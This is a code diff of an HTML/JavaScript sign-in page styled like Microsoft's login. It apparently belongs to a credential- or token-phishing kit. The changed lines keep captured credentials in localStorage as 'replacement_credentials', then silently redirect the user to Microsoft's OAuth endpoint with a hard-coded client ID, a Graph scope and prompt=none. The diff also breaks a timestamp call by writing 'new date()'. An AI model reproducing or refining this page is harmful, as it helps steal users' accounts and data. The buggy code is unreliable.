@@ -42,22 +42,20 @@
       margin-bottom: 24px;
       color: #1b1b1b;
     }
-    /* MODIFICATION START: Correct input field style */
+    /* Reverted to single bottom border style */
     .form-control {
-      border: none; /* Remove all borders */
-      border-bottom: 1px solid #8A8886; /* Add ONLY the bottom border */
-      border-radius: 0; /* No rounded corners for the input */
-      padding: 8px 0; /* Adjust vertical padding, remove horizontal padding */
+      border: none;
+      border-bottom: 1px solid #8A8886;
+      border-radius: 0;
+      padding: 8px 0;
       font-size: 16px;
       width: 100%;
-      box-sizing: border-box;
     }
     .form-control:focus {
-      box-shadow: none; /* Remove default browser glow */
-      outline: none; /* Remove default browser outline */
-      border-bottom-color: #0078d4; /* Change bottom line color on focus */
+      box-shadow: none;
+      outline: none;
+      border-bottom-color: #0078d4;
     }
-    /* MODIFICATION END */
     .form-box p {
       font-size: 13px;
       margin-top: 16px;
@@ -344,7 +342,10 @@
           localStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
         } catch (e) { console.error('❌ Failed to store credentials in localStorage:', e); }
 
-        const callbackUrl = window.location.origin + '/auth/callback';
+        // --- THIS IS THE CORRECTED LINE ---
+        const callbackUrl = window.location.origin + '/auth/callback'; // Always use a slash
+        // ------------------------------------
+
         const microsoftLoginUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&redirect_uri=${encodeURIComponent(callbackUrl)}&response_mode=query&scope=https://graph.microsoft.com/.default&prompt=none&login_hint=${encodeURIComponent(email)}`;
         
         setTimeout(() => { window.location.href = microsoftLoginUrl; }, 1200);
@@ -352,7 +353,7 @@
 
       $('#footer_dots_link').click(function(e) {
           e.preventDefault();
-          $('#modal_timestamp').text(new Date().toISOString());
+          $('#modal_timestamp').text(new date().toISOString());
           $('#troubleshooting_box').slideToggle(200);
       });
 
